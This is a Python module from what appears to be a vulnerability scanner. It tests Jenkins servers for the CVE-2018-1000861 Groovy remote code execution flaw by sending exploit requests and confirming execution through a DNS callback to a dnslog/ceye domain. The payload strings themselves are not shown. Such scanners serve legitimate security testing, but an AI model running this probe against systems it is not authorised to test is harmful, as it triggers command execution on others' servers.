#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2018_1000861_scan(self, url):
    ''' Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误
            检查操作是没有沙盒的, 攻击者可以通过Meta-Programming的方式, 在检查这个步骤时执行任意命令
    '''
    sessid = 'ae9b030320374b97c35d76dfbe5c5eb6'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2018-1000861'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2018_1000861_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].replace('dnsdomain', dns_domain) # * Path
        data = payload['data']                                  # * Data
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            sleep(2)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
